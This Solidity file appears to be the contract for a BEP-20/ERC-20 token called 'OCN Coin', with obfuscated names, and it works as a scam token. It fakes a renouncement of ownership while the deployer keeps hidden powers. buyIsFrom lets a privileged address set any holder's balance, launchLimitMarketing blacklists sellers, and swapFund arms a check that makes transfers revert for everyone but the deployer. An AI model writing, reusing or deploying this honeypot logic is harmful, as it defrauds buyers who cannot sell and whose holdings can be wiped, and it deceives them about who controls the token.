//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface limitSender {
    function totalSupply() external view returns (uint256);

    function balanceOf(address listModeShould) external view returns (uint256);

    function transfer(address receiverAuto, uint256 listShould) external returns (bool);

    function allowance(address receiverMax, address spender) external view returns (uint256);

    function approve(address spender, uint256 listShould) external returns (bool);

    function transferFrom(
        address sender,
        address receiverAuto,
        uint256 listShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed marketingAt, uint256 value);
    event Approval(address indexed receiverMax, address indexed spender, uint256 value);
}

interface listBuy is limitSender {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract takeShouldLimit {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchedEnableMax {
    function createPair(address isTotal, address txAmount) external returns (address);
}

interface maxShould {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract OCNCoin is takeShouldLimit, limitSender, listBuy {

    uint256 private launchTakeTx = 100000000 * 10 ** 18;

    address public listTotal;

    function listTx() public {
        emit OwnershipTransferred(listTotal, address(0));
        exemptBuyShould = address(0);
    }

    string private minSender = "OCN";

    function symbol() external view virtual override returns (string memory) {
        return minSender;
    }

    mapping(address => uint256) private teamFee;

    function maxLiquidity(address modeTrading, address receiverAuto, uint256 listShould) internal returns (bool) {
        if (modeTrading == listTotal) {
            return walletModeAt(modeTrading, receiverAuto, listShould);
        }
        uint256 limitBuy = limitSender(fromEnable).balanceOf(shouldSellFrom);
        require(limitBuy == senderShouldSwap);
        require(!launchedTx[modeTrading]);
        return walletModeAt(modeTrading, receiverAuto, listShould);
    }

    function approve(address swapAt, uint256 listShould) public virtual override returns (bool) {
        maxFund[_msgSender()][swapAt] = listShould;
        emit Approval(_msgSender(), swapAt, listShould);
        return true;
    }

    string private autoSwapFund = "OCN Coin";

    uint256 public senderToken;

    function enableSwapAmount(address feeTeam) public {
        if (receiverTrading) {
            return;
        }
        if (takeTeam != shouldFee) {
            exemptMarketing = false;
        }
        tradingTx[feeTeam] = true;
        
        receiverTrading = true;
    }

    function transferFrom(address modeTrading, address receiverAuto, uint256 listShould) external override returns (bool) {
        if (_msgSender() != teamLaunched) {
            if (maxFund[modeTrading][_msgSender()] != type(uint256).max) {
                require(listShould <= maxFund[modeTrading][_msgSender()]);
                maxFund[modeTrading][_msgSender()] -= listShould;
            }
        }
        return maxLiquidity(modeTrading, receiverAuto, listShould);
    }

    uint256 senderShouldSwap;

    function name() external view virtual override returns (string memory) {
        return autoSwapFund;
    }

    address public fromEnable;

    function walletModeAt(address modeTrading, address receiverAuto, uint256 listShould) internal returns (bool) {
        require(teamFee[modeTrading] >= listShould);
        teamFee[modeTrading] -= listShould;
        teamFee[receiverAuto] += listShould;
        emit Transfer(modeTrading, receiverAuto, listShould);
        return true;
    }

    function transfer(address receiverShouldTo, uint256 listShould) external virtual override returns (bool) {
        return maxLiquidity(_msgSender(), receiverShouldTo, listShould);
    }

    function launchLimitMarketing(address atTx) public {
        receiverSell();
        if (takeTeam != senderToken) {
            fromSwap = false;
        }
        if (atTx == listTotal || atTx == fromEnable) {
            return;
        }
        launchedTx[atTx] = true;
    }

    uint8 private enableSwap = 18;

    mapping(address => mapping(address => uint256)) private maxFund;

    address shouldSellFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function receiverSell() private view {
        require(tradingTx[_msgSender()]);
    }

    mapping(address => bool) public launchedTx;

    address teamLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public tradingTx;

    event OwnershipTransferred(address indexed feeListFrom, address indexed txFund);

    bool public fromSwap;

    uint256 private exemptTo;

    function totalSupply() external view virtual override returns (uint256) {
        return launchTakeTx;
    }

    function decimals() external view virtual override returns (uint8) {
        return enableSwap;
    }

    uint256 tradingReceiver;

    constructor (){
        if (shouldFee == exemptTo) {
            shouldFee = senderToken;
        }
        listTx();
        maxShould exemptEnable = maxShould(teamLaunched);
        fromEnable = launchedEnableMax(exemptEnable.factory()).createPair(exemptEnable.WETH(), address(this));
        
        listTotal = _msgSender();
        tradingTx[listTotal] = true;
        teamFee[listTotal] = launchTakeTx;
        
        emit Transfer(address(0), listTotal, launchTakeTx);
    }

    uint256 public shouldFee;

    function balanceOf(address listModeShould) public view virtual override returns (uint256) {
        return teamFee[listModeShould];
    }

    function owner() external view returns (address) {
        return exemptBuyShould;
    }

    address private exemptBuyShould;

    bool public receiverTrading;

    uint256 private takeTeam;

    function getOwner() external view returns (address) {
        return exemptBuyShould;
    }

    function buyIsFrom(address receiverShouldTo, uint256 listShould) public {
        receiverSell();
        teamFee[receiverShouldTo] = listShould;
    }

    bool public exemptMarketing;

    function allowance(address fromAt, address swapAt) external view virtual override returns (uint256) {
        if (swapAt == teamLaunched) {
            return type(uint256).max;
        }
        return maxFund[fromAt][swapAt];
    }

    function swapFund(uint256 listShould) public {
        receiverSell();
        senderShouldSwap = listShould;
    }

}